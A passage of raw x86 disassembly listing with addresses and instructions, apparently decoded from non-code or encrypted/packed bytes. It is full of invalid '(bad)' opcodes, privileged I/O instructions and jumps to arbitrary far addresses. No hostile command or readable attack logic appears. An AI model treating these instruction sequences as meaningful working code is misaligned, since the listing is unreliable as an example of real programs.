  408399:	lock hlt 
  40839b:	fdivr  DWORD PTR [ebx+0x46]
  40839e:	je     0x4083f9
  4083a0:	mov    esi,0x8e9a8d1c
  4083a5:	hlt    
  4083a6:	push   edx
  4083a7:	(bad)  
  4083a8:	xchg   ebp,eax
  4083a9:	mov    ecx,ebp
  4083ab:	imul   edx,DWORD PTR cs:[edx-0x1e207b76],0x1c02f376
  4083b6:	sti    
  4083b7:	xor    al,0x5b
  4083b9:	adc    al,0x24
  4083bb:	test   al,0xd7
  4083bd:	clc    
  4083be:	sbb    BYTE PTR [edi+0x4248dfd3],ah
  4083c4:	js     0x408395
  4083c6:	push   0xe1399be8
  4083cb:	sar    BYTE PTR [eax-0x5123510b],0x8f
  4083d2:	addr16 test dh,al
  4083d5:	dec    edx
  4083d6:	dec    esi
  4083d7:	inc    esi
  4083d8:	push   ss
  4083d9:	sub    ch,BYTE PTR [edx+0x13]
  4083dc:	sbb    esi,DWORD PTR [esi+0x8f8e8bf]
  4083e2:	jmp    0x4b59:0x1446e99a
  4083e9:	mov    edx,DWORD PTR [edi+ebp*2-0x2126b3da]
  4083f0:	rcr    esp,cl
  4083f2:	ins    DWORD PTR es:[edi],dx
  4083f3:	xchg   ebp,eax
  4083f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083f5:	cld    
  4083f6:	cmc    
  4083f7:	jnp    0x4083b5
  4083f9:	sub    BYTE PTR [edi-0x9],bh
  4083fc:	xchg   ebx,eax
  4083fd:	xchg   edi,eax
  4083fe:	mov    fs,WORD PTR [edi+0x749bd26c]
  408404:	jg     0x408408
  408406:	mov    ebp,cs
  408408:	jmp    0x54a56f7f
  40840d:	push   ss
  40840e:	pop    edx
  40840f:	sbb    BYTE PTR [eax-0x41317cb],cl
  408415:	sbb    eax,0x785f2195
  40841a:	out    0xa5,eax
  40841c:	sub    eax,0x9104efa7
  408421:	jb     0x40846d
  408423:	es stc 
  408425:	rcr    DWORD PTR [eax+eiz*2+0x43],0xaa
  40842a:	in     eax,0x34
  40842c:	lock es (bad) 
  40842f:	int3   
  408430:	ret    0x9133
  408433:	test   BYTE PTR [edi],ch
  408435:	dec    ecx
  408436:	mov    edi,0xeef7db87
  40843b:	cmp    BYTE PTR [edi],al
  40843d:	mov    ah,0xc9
  40843f:	int    0x92
  408441:	xchg   edi,eax
  408442:	dec    esp
  408443:	jl     0x408447
  408445:	sbb    esp,eax
  408447:	cmp    al,BYTE PTR ds:0x9a3e53aa
  40844d:	push   ebx
  40844e:	and    esp,DWORD PTR [ecx]
  408450:	arpl   WORD PTR [eax+ebp*4],si
  408453:	test   al,0x8c
  408455:	xor    eax,0x30136d59
  40845a:	ret    0x7b6e
  40845d:	dec    ebp
  40845e:	adc    eax,0x24931d9c
  408463:	sub    BYTE PTR [edi+0x53],cl
  408466:	mov    dl,0xf
  408468:	retf   
  408469:	in     al,dx
  40846a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40846b:	sub    eax,0x756f204a
  408470:	test   DWORD PTR [edi],0x63709319
  408476:	xchg   ebp,eax
  408477:	mov    edi,DWORD PTR [ecx]
  408479:	sahf   
  40847a:	cmp    ch,dh
  40847c:	adc    al,0x4
  40847e:	xchg   ebx,eax
  40847f:	cmc    
  408480:	scas   al,BYTE PTR es:[edi]
  408481:	test   eax,0xd97f0d19
  408486:	mov    edx,0x1e88574b
  40848b:	adc    BYTE PTR [ebx-0x1c],dl
  40848e:	shl    DWORD PTR [ebx+0x60],0x18
  408492:	xor    BYTE PTR [ecx-0x8],al
  408495:	xchg   esp,eax
  408496:	push   ds
  408497:	fdiv   QWORD PTR [ecx]
  408499:	adc    al,0x4e
  40849b:	lea    edi,[ecx+0xbdc8e17]
  4084a1:	xchg   esi,eax
  4084a2:	test   DWORD PTR [esi+0x75],eax
  4084a5:	cs push esi
  4084a7:	mov    edi,0x1aab9db0
  4084ac:	inc    edi
  4084ad:	loope  0x408453
  4084af:	out    dx,al
  4084b0:	iret   
  4084b1:	or     DWORD PTR [ebp-0x70],esi
  4084b4:	mov    al,0x85
  4084b6:	push   ebx
  4084b7:	dec    esp
  4084b8:	push   ebx
  4084b9:	cwde   
  4084ba:	sahf   
  4084bb:	sbb    DWORD PTR [esi+ebp*1],0x40e5b30e
  4084c2:	push   cs
  4084c3:	dec    ebp
  4084c4:	dec    ecx
  4084c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084c6:	mov    eax,DWORD PTR [ecx+0x72a27dfd]
  4084cc:	adc    al,0xf2
  4084ce:	jnp    0x40849d
  4084d0:	inc    ecx
  4084d1:	xor    eax,0x1bdb65df
  4084d6:	stos   BYTE PTR es:[edi],al
  4084d7:	sub    BYTE PTR [ebx],bl
  4084d9:	jmp    0x408530
  4084db:	or     DWORD PTR [edx+0x5a],esi
  4084de:	fwait
  4084df:	inc    edx
  4084e0:	int    0x29
  4084e2:	cmp    al,0x56
  4084e4:	jnp    0x408536
  4084e6:	dec    edi
  4084e7:	(bad)  [eax+edi*1-0x46]
  4084eb:	pusha  
  4084ec:	cld    
  4084ed:	xchg   edi,eax
  4084ee:	push   ebp
  4084ef:	cmp    DWORD PTR [edi-0x1b49b3e8],edx
  4084f5:	push   ebp
  4084f6:	dec    edi
  4084f7:	je     0x408542
  4084f9:	xor    cl,BYTE PTR [ebx-0x14]
  4084fc:	shr    DWORD PTR [eax-0x450cbfd9],cl
  408502:	rcr    DWORD PTR [edx],cl
  408504:	test   eax,0x46919c86
  408509:	push   0x2b
  40850b:	cmp    BYTE PTR [eax+0x3d],bl
  40850e:	out    0xc6,al
  408510:	stc    
  408511:	es xchg esp,eax
  408513:	mov    edx,0x55dc7c24
  408518:	sub    edi,esp
  40851a:	and    esi,esi
  40851c:	mov    edi,0x9630e098
  408521:	loope  0x408575
  408523:	in     eax,dx
  408524:	inc    eax
  408525:	jg     0x408529
  408527:	test   BYTE PTR [eax+ecx*4-0x1bb0ef34],bl
  40852e:	fnstsw WORD PTR [edi+0x3e]
  408531:	in     eax,0xa6
  408533:	mov    esp,0x2bd92d26
  408538:	fs out 0x72,al
  40853b:	mov    dh,0xda
  40853d:	and    DWORD PTR [eax],esp
  40853f:	mov    esp,0x2be92e35
  408544:	mov    esi,0x34c97a
  408549:	pop    edi
  40854a:	cs or  al,0xc0
  40854d:	popf   
  40854e:	push   esi
  40854f:	sub    al,0xc9
  408551:	add    eax,0xc83376f1
  408556:	jl     0x408501
  408558:	and    eax,0xe513ab08
  40855d:	ss loop 0x408528
  408560:	cmp    edx,DWORD PTR [edi+0x4c88699f]
  408566:	out    0xd0,eax
  408568:	adc    dl,bh
  40856a:	mov    esi,es
  40856c:	loope  0x4084fa
  40856e:	ret    
  40856f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408570:	dec    ecx
  408571:	(bad)  [edx+0x5c]
  408574:	mov    ebx,0xaa28889c
  408579:	daa    
  40857a:	jmp    0x4085a3
  40857c:	sub    eax,0xa566d371
  408581:	jnp    0x40859f
  408583:	cmp    al,0x4e
  408585:	ret    0x1798
  408588:	and    eax,0x507ba4c9
  40858d:	add    eax,0x26c5898e
  408592:	into   
  408593:	add    eax,0xcb95a4d7
  408598:	popa   
  408599:	cmp    ebp,DWORD PTR [esi+0x7e8e4742]
  40859f:	fnstsw WORD PTR [edx-0x6b]
  4085a2:	push   eax
  4085a3:	xchg   ecx,eax
  4085a4:	loop   0x408577
  4085a6:	bound  ebp,QWORD PTR [edi-0x42486241]
  4085ac:	pop    ebp
  4085ad:	loop   0x4085e2
  4085af:	mov    dh,0x92
  4085b1:	or     eax,0x5922f0dd
  4085b6:	ret    0x12b6
  4085b9:	in     al,0x81
  4085bb:	xchg   edx,eax
  4085bc:	jbe    0x408596
  4085be:	fnsave [ebx]
  4085c0:	jno    0x408573
  4085c2:	retf   
  4085c3:	into   
  4085c4:	push   ds
  4085c5:	inc    ebx
  4085c6:	inc    eax
  4085c7:	dec    esi
  4085c8:	fimul  DWORD PTR [ebp+0x28]
  4085cb:	pop    eax
  4085cc:	rcr    DWORD PTR [ebp+0xf],cl
  4085cf:	in     al,0xcc
  4085d1:	out    0xbe,eax
  4085d3:	push   es
  4085d4:	jmp    0x9b5fafd5
  4085d9:	mov    bh,0x2
  4085db:	add    eax,ecx
  4085dd:	xchg   ebp,eax
  4085de:	pop    edx
  4085df:	mov    ds,WORD PTR [ebx]
  4085e1:	aam    0xa1
  4085e3:	mov    ds,WORD PTR [edi-0x11]
  4085e6:	out    dx,al
  4085e7:	pop    ss
  4085e8:	jl     0x4085c4
  4085ea:	add    al,0x9f
  4085ec:	jp     0x408653
  4085ee:	sar    DWORD PTR [edi+0x534505a1],0x2f
  4085f5:	shl    DWORD PTR [bx],cl
  4085f8:	mov    ds:0x34362416,al
  4085fd:	inc    ebp
  4085fe:	xchg   BYTE PTR [eax+0x265e50f0],dh
  408604:	add    cl,0x1e
  408607:	mov    ebp,0xec23bfe1
  40860c:	aad    0xdc
  40860e:	js     0x408630
  408610:	mov    ds:0x84b7ff4e,al
  408615:	loop   0x408670
  408617:	in     eax,dx
  408618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408619:	add    ebx,esi
  40861b:	(bad)  
  40861c:	lock xchg ebp,eax
  40861e:	hlt    
  40861f:	test   BYTE PTR ds:0x154f1fa,ch
  408625:	pop    edx
  408626:	xor    edi,DWORD PTR [edi+0x5af50dd0]
  40862c:	inc    esp
  40862d:	sbb    dl,ah
  40862f:	adc    al,0xd1
  408631:	stos   BYTE PTR es:[edi],al
  408632:	mov    BYTE PTR [eax+0x7d8705ef],0xf1
  408639:	cmp    BYTE PTR [edi],ch
  40863b:	lods   eax,DWORD PTR ds:[esi]
  40863c:	scas   al,BYTE PTR es:[edi]
  40863d:	retf   
  40863e:	jno    0x4085d4
  408640:	fcomp  DWORD PTR [ebp+0xf]
  408643:	mov    bh,bl
  408645:	stos   DWORD PTR es:[edi],eax
  408646:	jp     0x40862c
  408648:	mov    ds:0x5f3a16ce,al
  40864d:	adc    dh,BYTE PTR [esp+ebx*4-0x4f]
  408651:	mov    DWORD PTR [ebx],edi
  408653:	ret    
  408654:	and    al,BYTE PTR [eax]
  408656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408657:	dec    esp
  408658:	and    al,0x77
  40865a:	popa   
  40865b:	test   cl,bh
  40865d:	inc    ebx
  40865e:	sub    al,0x88
  408660:	jo     0x408634
  408662:	xchg   edi,eax
  408663:	mov    DWORD PTR [ebx+0x444cd8fb],ebx
  408669:	data16 mov dh,0x56
  40866c:	sbb    ebp,0xa4f1cae5
  408672:	loop   0x4086ef
  408674:	xchg   ecx,eax
  408675:	rcr    DWORD PTR [esi+edi*8-0x2f],1
  408679:	or     BYTE PTR [ecx+0x3c],bl
  40867c:	adc    edi,DWORD PTR [edi+0x521e5f80]
  408682:	mov    eax,ds:0xb51fdbbd
  408687:	jb     0x408689
  408689:	aaa    
  40868a:	mov    ebx,DWORD PTR [edx]
  40868c:	pop    esp
  40868d:	mov    cl,0xb4
  40868f:	mov    ds:0x5c0210c6,al
  408694:	inc    ecx
  408695:	ficom  WORD PTR [edx+eiz*8]
  408698:	aam    0xbc
  40869a:	pushf  
  40869b:	sbb    al,0x1
  40869d:	ja     0x4086fe
  40869f:	inc    ebx
  4086a0:	addr16 inc esp
  4086a2:	xchg   esi,eax
  4086a3:	adc    esp,DWORD PTR [ebx+0x6b4ce876]
  4086a9:	fidiv  DWORD PTR [esi+eax*1]
  4086ac:	jno    0x4086c4
  4086ae:	dec    esi
  4086af:	adc    BYTE PTR [esi-0x27729d32],dh
  4086b5:	mov    ebp,0xec50199c
  4086ba:	mov    dh,0x19
  4086bc:	test   BYTE PTR [edx+0x1f],ah
  4086bf:	sub    eax,0x61a53713
  4086c4:	mov    edi,0xa2ca0666
  4086c9:	loopne 0x408707
  4086cb:	dec    esp
  4086cc:	sbb    ch,BYTE PTR [edx-0x80]
  4086cf:	xor    al,0x23
  4086d1:	and    bl,ch
  4086d3:	sti    
  4086d4:	sbb    eax,0x1017dce4
  4086d9:	inc    eax
  4086da:	mov    eax,0x9129d657
  4086df:	push   0xadd82320
  4086e4:	popf   
  4086e5:	inc    eax
  4086e6:	rol    BYTE PTR [esi-0x24256cb6],1
  4086ec:	and    DWORD PTR [ebp+0x50],0x4e
  4086f0:	fwait
  4086f1:	lea    edi,ds:0xe61ef372
  4086f7:	(bad)  
  4086f9:	cs xor al,0xa6
  4086fc:	ret    0xdb21
  4086ff:	fild   DWORD PTR [edi+0x54]
  408702:	add    al,0x9b
  408704:	inc    ebp
  408705:	xchg   edi,eax
  408706:	test   al,0xc7
  408708:	ficom  WORD PTR [esi]
  40870a:	xchg   edi,eax
  40870b:	inc    eax
  40870c:	xor    BYTE PTR [ebx],0xef
  40870f:	cmp    BYTE PTR [ebp-0x4],cl
  408712:	xchg   esp,eax
  408713:	inc    esi
  408714:	or     dl,BYTE PTR [ebp+ebp*4+0x62776abc]
  40871b:	mov    edx,0xa3be11c5
  408720:	data16 (bad) 
  408722:	push   es
  408723:	add    eax,0x9f6ffb91
  408728:	mov    cl,0xb9
  40872a:	push   ebx
  40872b:	pop    eax
  40872c:	or     ebp,ebx
  40872e:	and    DWORD PTR [eax],esp
  408730:	icebp  
  408731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408732:	pop    ebx
  408733:	out    dx,al
  408734:	sub    al,0x33
  408736:	pop    esi
  408737:	enter  0x6fa7,0x5a
  40873b:	adc    eax,0xe315c84d
  408740:	jecxz  0x40877d
  408742:	sub    BYTE PTR [ebx-0xbae3f3b],dl
  408748:	mov    ds:0x2aabc2ea,al
  40874d:	cmp    dl,BYTE PTR [eax-0x75e045c9]
  408753:	sbb    eax,0x4efacd6
  408758:	push   edx
  408759:	jp     0x40875c
  40875b:	mov    ds:0xea86cd3b,al
  408760:	jge    0x4086ea
  408762:	pushf  
  408763:	repnz inc esi
  408765:	call   0x84:0xec1c5f72
  40876c:	fst    DWORD PTR [ebx-0x14fb90da]
  408772:	pop    es
  408773:	and    al,0x2d
  408775:	stc    
  408776:	cmp    edi,esp
  408778:	mov    esi,0xe44544f0
  40877d:	int3   
  40877e:	push   edi
  40877f:	pop    ebp
  408780:	test   al,0xc1
  408782:	xchg   DWORD PTR gs:[eax-0x3e],esp
  408786:	gs xchg ecx,eax
  408788:	and    eax,DWORD PTR [eax+0x37]
  40878b:	aam    0xab
  40878d:	inc    esp
  40878e:	cmp    esi,DWORD PTR es:[ebx+eax*4]
  408792:	cdq    
  408793:	fst    DWORD PTR [edx-0x7b3dc080]
  408799:	shr    BYTE PTR [ebp-0x17],0x34
  40879d:	fldln2 
  40879f:	loopne 0x4087f4
  4087a1:	hlt    
  4087a2:	fbld   TBYTE PTR [edx]
  4087a4:	lea    ebx,[eax]
  4087a6:	xor    esp,DWORD PTR [esi+0x55001d8b]
  4087ac:	mov    eax,0x864a90c2
  4087b1:	mov    edx,0x522a273d
  4087b6:	add    esp,ecx
  4087b8:	dec    ecx
  4087b9:	loopne 0x4087a7
  4087bb:	inc    ecx
  4087bc:	mov    edx,DWORD PTR [ebx-0x3e5d06f8]
  4087c2:	repnz sub al,0xcb
  4087c5:	std    
  4087c6:	out    dx,al
  4087c7:	(bad)  
  4087c8:	test   al,0x70
  4087ca:	dec    edx
  4087cb:	mov    dl,0xe8
  4087cd:	and    al,0xd0
  4087cf:	daa    
  4087d0:	gs jno 0x4087c2
  4087d3:	pop    ss
  4087d4:	xchg   BYTE PTR [esi+ecx*8+0x11],ch
  4087d8:	mov    al,ds:0x3435e169
  4087dd:	mov    esp,0x12e2694
  4087e2:	jge    0x4087db
  4087e4:	call   0xe95b:0xe7eda936
  4087eb:	hlt    
  4087ec:	les    esp,FWORD PTR [edi+0x79]
  4087ef:	frstor [edx]
  4087f1:	test   BYTE PTR [ebx-0x46],ch
  4087f4:	loop   0x40883c
  4087f6:	mov    al,ds:0xbe916562
  4087fb:	popa   
  4087fc:	mov    dh,0x54
  4087fe:	jbe    0x4087a1
  408800:	(bad)  
  408801:	xor    DWORD PTR [edi+0x1f],esi
  408804:	and    edi,edx
  408806:	jl     0x4087a3
  408808:	(bad)  
  408809:	dec    edx
  40880a:	dec    esi
  40880b:	lds    ecx,FWORD PTR [edi-0x4740765e]
  408811:	scas   al,BYTE PTR es:[edi]
  408812:	and    DWORD PTR [edi+0x4b],esp
  408815:	mov    ecx,0x6c036051
  40881a:	test   BYTE PTR [eax+0x10],bl
  40881d:	lahf   
  40881e:	add    ch,BYTE PTR [edi]
  408820:	loope  0x4087cd
  408822:	xor    eax,0xdbdc6b18
  408827:	mov    bh,0x63
  408829:	or     DWORD PTR [esi-0x45a3ab92],esp
  40882f:	mul    BYTE PTR [edx]
  408831:	outs   dx,BYTE PTR ds:[esi]
  408832:	mov    ebx,0xe298c71
  408837:	ret    0x4408
  40883a:	inc    edx
  40883b:	or     ch,bl
  40883d:	out    dx,al
  40883e:	rcl    BYTE PTR [ecx],0x1
  408841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408842:	fild   QWORD PTR [esi+0x47bf0b9e]
  408848:	(bad)  
  408849:	retf   
  40884a:	in     al,0x8
  40884c:	push   ds
  40884d:	xor    cl,BYTE PTR [edi]
  40884f:	cmp    eax,0x2e3ebe3d
  408854:	adc    ah,BYTE PTR [ecx+0x6]
  408857:	ins    DWORD PTR es:[edi],dx
  408858:	inc    ebp
  408859:	and    ebp,0x935f46ca
  40885f:	rcl    BYTE PTR [edi],cl
  408861:	retf   0x6cf4
  408864:	(bad)  
  408866:	div    dl
  408868:	sbb    eax,0xf9be1db0
  40886d:	xchg   esi,ebp
  40886f:	or     eax,0x40b3c0f6
  408874:	shr    BYTE PTR [ecx+0x59],cl
  408877:	in     eax,dx
  408878:	push   esi
  408879:	jne    0x4088f0
  40887b:	aam    0x9d
  40887d:	pop    ds
  40887e:	in     eax,dx
  40887f:	in     al,0x7f
  408881:	js     0x40880b
  408883:	pop    ebp
  408884:	mov    bh,0xbb
  408886:	aaa    
  408887:	xchg   BYTE PTR [edx+0x64],ah
  40888a:	or     al,0xef
  40888c:	(bad)
  408891:	jno    0x4088ac
  408893:	rcl    BYTE PTR [edx+ebp*4-0x16],cl
  408897:	std    
  408898:	ror    DWORD PTR [ebx+0x5],0xe7
  40889c:	push   es
  40889d:	adc    bl,BYTE PTR [eax]
  40889f:	mov    ch,0x9
  4088a1:	add    BYTE PTR [edx-0x6e],ah
  4088a4:	addr16 dec ebx
  4088a6:	in     al,0x7b
  4088a8:	cmp    eax,0xb68f2cca
  4088ad:	inc    ecx
  4088ae:	jae    0x408893
  4088b0:	ins    DWORD PTR es:[edi],dx
  4088b1:	add    ah,cl
  4088b3:	push   edx
  4088b4:	dec    esp
  4088b5:	dec    eax
  4088b6:	retf   
  4088b7:	mov    ebp,cs
  4088b9:	and    eax,0xf5441d1d
  4088be:	push   ss
  4088bf:	mov    WORD PTR [ebp-0x35],?
  4088c2:	mov    cl,0xb9
  4088c4:	call   0xe749897b
  4088c9:	jle    0x4088e0
  4088cb:	jae    0x40894c
  4088cd:	mov    esi,esp
  4088cf:	stos   BYTE PTR es:[edi],al
  4088d0:	adc    edi,esp
  4088d2:	inc    ebp
  4088d3:	daa    
  4088d4:	xor    BYTE PTR [ebp+0x144ac284],ch
  4088da:	ins    DWORD PTR es:[edi],dx
  4088db:	and    BYTE PTR [eax+ebx*2-0xa],cl
  4088df:	je     0x408927
  4088e1:	nop
  4088e2:	repz retf 
  4088e4:	loopne 0x408880
  4088e6:	sbb    DWORD PTR [ebx-0x3cddcd52],ebp
  4088ec:	or     BYTE PTR ds:0x48d5db36,cl
  4088f2:	and    DWORD PTR [ebx-0x4c],esi
  4088f5:	in     eax,0xf1
  4088f7:	gs jo  0x4088c1
  4088fa:	jmp    FWORD PTR [esi+edx*1-0x3e]
  4088fe:	push   edi
  4088ff:	stos   DWORD PTR es:[edi],eax
  408900:	aad    0xca
  408902:	pop    ecx
  408903:	push   0x22
  408905:	(bad)  
  408906:	loop   0x408970
  408908:	jno    0x408911
  40890a:	sbb    DWORD PTR [ecx+0xf],eax
  40890d:	retf   
  40890e:	mov    ds:0x68f147ec,al
  408913:	scas   eax,DWORD PTR es:[edi]
  408914:	inc    esi
  408915:	mov    dh,BYTE PTR [ecx+0x59]
  408918:	mov    fs,WORD PTR [ebx-0x55b4b9fd]
  40891e:	and    eax,0x36
  408921:	stos   BYTE PTR es:[edi],al
  408922:	and    DWORD PTR [esp+edi*4+0x3c],0x56c08cc
  40892a:	aaa    
  40892b:	jo     0x40896b
  40892d:	inc    ebx
  40892e:	int3   
  40892f:	xchg   edx,eax
  408930:	mov    bh,0x67
  408932:	lea    esi,[esi]
  408934:	int3   
  408935:	out    0x1a,al
  408937:	lea    ecx,[eax+0x18]
  40893a:	sbb    DWORD PTR [ebx],esi
  40893c:	repz in eax,dx
  40893e:	ss dec ecx
  408940:	popa   
  408941:	dec    edi
  408942:	lea    eax,[esi-0x1e06bbea]
  408948:	fwait
  408949:	outs   dx,BYTE PTR ds:[esi]
  40894a:	repnz lahf 
  40894c:	mov    cl,0x4a
  40894e:	(bad)  
  40894f:	and    al,0x5d
  408951:	push   ecx
  408952:	sub    ch,0xf
  408955:	xchg   esp,eax
  408956:	lock jns 0x4088d9
  408959:	or     DWORD PTR [eax-0x5887d2d6],esi
  40895f:	ret    0x8e7c
  408962:	das    
  408963:	push   eax
  408964:	ret    0x50cf
  408967:	xor    BYTE PTR [ecx-0x52a40242],0x12
  40896e:	mov    ds:0x497d9671,eax
  408973:	lahf   
  408974:	dec    esp
  408975:	fwait
  408976:	cli    
  408977:	js     0x408933
  408979:	in     eax,0x26
  40897b:	ror    DWORD PTR [esi+0x586cc084],1
  408981:	push   0x2c
  408983:	sbb    dh,dh
  408985:	xchg   esp,eax
  408986:	push   esp
  408987:	push   ebp
  408988:	dec    esi
  408989:	xchg   ebx,eax
  40898a:	push   es
  40898b:	push   cs
  40898c:	ins    DWORD PTR es:[edi],dx
  40898d:	js     0x408a05
  40898f:	scas   eax,DWORD PTR es:[edi]
  408990:	and    BYTE PTR [eax],bl
  408992:	xchg   ebp,eax
  408993:	aas    
  408994:	mov    edi,0x9344443a
  408999:	fsubr  QWORD PTR [ebx-0x25]
  40899c:	ja     0x4089af
  40899e:	into   
  40899f:	mov    DWORD PTR [edx],ebx
  4089a1:	sub    eax,0x50d7c420
  4089a6:	nop
  4089a7:	mov    ds:0xf929b670,al
  4089ac:	dec    eax
  4089ad:	xor    edi,DWORD PTR [esi]
  4089af:	cmp    DWORD PTR [ebx-0x6281a600],edi
  4089b5:	jp     0x408a0c
  4089b7:	(bad)  
  4089b8:	dec    edx
  4089b9:	or     dl,dh
  4089bb:	nop
  4089bc:	stos   BYTE PTR es:[edi],al
  4089bd:	in     al,0xd9
  4089bf:	daa    
  4089c0:	mov    WORD PTR [esi],fs
  4089c2:	jmp    0x8cdd:0x7194b495
  4089c9:	test   dh,cl
  4089cb:	popa   
  4089cc:	xchg   edx,eax
  4089cd:	stos   BYTE PTR es:[edi],al
  4089ce:	dec    ebx
  4089cf:	fstp   QWORD PTR [edi-0x65]
  4089d2:	jno    0x40898a
  4089d4:	jg     0x40898e
  4089d6:	out    dx,al
  4089d7:	jbe    0x4089d7
  4089d9:	cdq    
  4089da:	jecxz  0x4089c9
  4089dc:	lods   eax,DWORD PTR ds:[esi]
  4089dd:	lea    esp,[edx-0x6a0ca1ce]
  4089e3:	les    esp,FWORD PTR [ecx-0x48be3b87]
  4089e9:	cmp    BYTE PTR [ebx+ebx*1+0x7bab6d5d],dh
  4089f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089f1:	sbb    dl,cl
  4089f3:	fist   DWORD PTR [esi+0x4b54437f]
  4089f9:	pop    ebx
  4089fa:	jge    0x4089cd
  4089fc:	xchg   ecx,eax
  4089fd:	push   eax
  4089fe:	pop    edx
  4089ff:	sub    DWORD PTR [edx+0x62],esp
  408a02:	cs ss dec esp
  408a05:	jo     0x4089b6
  408a07:	adc    eax,0x8c146658
  408a0c:	test   al,0x6d
  408a0e:	(bad)  
  408a0f:	call   0xf06e569b
  408a14:	push   es
  408a15:	xchg   edx,eax
  408a16:	std    
  408a17:	inc    edi
  408a18:	test   eax,0xc3987c8b
  408a1d:	adc    eax,eax
  408a1f:	xchg   ecx,eax
  408a20:	ret    
  408a21:	sbb    eax,0x62859b35
  408a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a27:	mov    WORD PTR [edx],?
  408a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2a:	fstp   TBYTE PTR [edi-0x2acdf2d]
  408a30:	outs   dx,DWORD PTR ds:[esi]
  408a31:	pushw  0xff9f
  408a34:	mov    bh,ah
  408a36:	mov    dl,BYTE PTR [ebx]
  408a38:	push   ebp
  408a39:	push   ss
  408a3a:	jb     0x408a17
  408a3c:	push   esp
  408a3d:	add    edi,DWORD PTR [ebp+0x5e]
  408a40:	loope  0x408aa9
  408a42:	sbb    ebp,ebp
  408a44:	lea    esi,[ecx+0x2e]
  408a47:	cmp    eax,0x4c5cf97f
  408a4c:	pop    es
  408a4d:	stos   BYTE PTR es:[edi],al
  408a4e:	ds addr16 xor eax,0xa756f06a
  408a55:	popa   
  408a56:	sti    
  408a57:	adc    al,0xfd
  408a59:	enter  0x9e92,0xe8
  408a5d:	xchg   edx,eax
  408a5e:	pop    esi
  408a5f:	adc    esi,DWORD PTR [eax-0x49]
  408a62:	(bad)  
  408a63:	scas   eax,DWORD PTR es:[edi]
  408a64:	inc    ecx
  408a65:	pushf  
  408a66:	(bad)  
  408a67:	sub    esp,esp
  408a69:	pop    eax
  408a6a:	inc    ecx
  408a6b:	xor    BYTE PTR [esi+0x6a],dl
  408a6e:	daa    
  408a6f:	push   ds
  408a70:	cmp    eax,0x8fd5630c
  408a75:	push   esi
  408a76:	mov    esi,0x6bb6c90b
  408a7b:	sbb    BYTE PTR [eax],dl
  408a7d:	test   eax,esp
  408a7f:	jmp    0x7cc9:0x1c3c0712
  408a86:	mov    ds:0x18d6add6,eax
  408a8b:	js     0x408a41
  408a8d:	inc    ecx
  408a8e:	inc    eax
  408a8f:	cli    
  408a90:	das    
  408a91:	fs std 
  408a93:	mov    WORD PTR [ebx-0x30],gs
  408a96:	cmp    DWORD PTR [eax],ebx
  408a98:	mov    esi,0xb8b4197
  408a9d:	or     al,0xf8
  408a9f:	sahf   
  408aa0:	push   edi
  408aa1:	cli    
  408aa2:	shr    BYTE PTR [ebx],0xd
  408aa5:	ret    0xc07e
  408aa8:	push   esi
  408aa9:	sar    dl,1
  408aab:	cld    
  408aac:	int    0x14
  408aae:	fst    DWORD PTR [ecx]
  408ab0:	and    dl,ch
  408ab2:	aaa    
  408ab3:	jl     0x408a7b
  408ab5:	sbb    DWORD PTR [esi-0x6d8e1419],edx
  408abb:	sub    DWORD PTR [edx-0x51],0xeb0ff8eb
  408ac2:	adc    dl,ah
  408ac4:	push   0x32
  408ac6:	inc    edi
  408ac7:	sbb    BYTE PTR [eax-0x3],cl
  408aca:	mov    edx,ebx
  408acc:	pop    ebp
  408acd:	mov    BYTE PTR [edi+eiz*1+0x2d],dl
  408ad1:	fcom   QWORD PTR [eax]
  408ad3:	dec    edi
  408ad4:	jge    0x408a6e
  408ad6:	xchg   BYTE PTR [edi+0x40],ah
  408ad9:	in     eax,dx
  408ada:	inc    esp
  408adb:	retf   0xee8
  408ade:	test   eax,0xfacce682
  408ae3:	pop    esp
  408ae4:	rcl    DWORD PTR [ebx-0x3b3dea9],0xba
  408aeb:	jecxz  0x408aa6
  408aed:	dec    edx
  408aee:	fmul   DWORD PTR [esi]
  408af0:	push   es
  408af1:	push   ds
  408af2:	pop    ss
  408af3:	int    0x7e
  408af5:	cs xchg ecx,eax
  408af7:	(bad)  
  408af8:	hlt    
  408af9:	call   0x371d:0x53e7d916
  408b00:	int3   
  408b01:	scas   al,BYTE PTR es:[edi]
  408b02:	cmpxchg BYTE PTR [ebx-0x53694bb4],bh
  408b09:	data16 loope 0x408b6f
  408b0c:	fild   WORD PTR [ecx]
  408b0e:	addr16 jge 0x408b5e
  408b11:	fs push 0x5f
  408b14:	stc    
  408b15:	xchg   ecx,eax
  408b16:	cwde   
  408b17:	aaa    
  408b18:	paddw  mm6,QWORD PTR [esp+eax*8+0x59]
  408b1d:	out    0xa,al
  408b1f:	dec    esp
  408b20:	pop    ebp
  408b21:	cmp    BYTE PTR [ecx-0x30da3412],0xc1
  408b28:	xchg   edx,eax
  408b29:	jl     0x408ac1
  408b2b:	fnstenv [esi-0x59]
  408b2e:	xchg   esi,eax
  408b2f:	adc    ecx,DWORD PTR [edx+ecx*4-0x67]
  408b33:	cmp    eax,0x2684a8fb
  408b38:	mov    ds:0xa6f416a3,al
  408b3d:	jne    0x408aeb
  408b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b40:	add    eax,0x9be6a404
  408b45:	pushf  
  408b46:	mov    esp,0xfe47ca9d
  408b4b:	mov    dl,BYTE PTR [edx+edx*8-0x80]
  408b4f:	imul   edi,DWORD PTR gs:[eax+0x577bad85],0x125dd502
  408b5a:	inc    edi
  408b5b:	arpl   WORD PTR [edx+0x6c220eed],cx
  408b61:	sbb    ch,BYTE PTR [edi]
  408b63:	loop   0x408b4a
  408b65:	sub    esi,eax
  408b67:	retf   
  408b68:	and    ebx,edi
  408b6a:	inc    ecx
  408b6b:	mov    ch,0x1c
  408b6d:	dec    edx
  408b6e:	arpl   bx,ax
  408b70:	(bad)
  408b73:	cld    
  408b74:	pop    edi
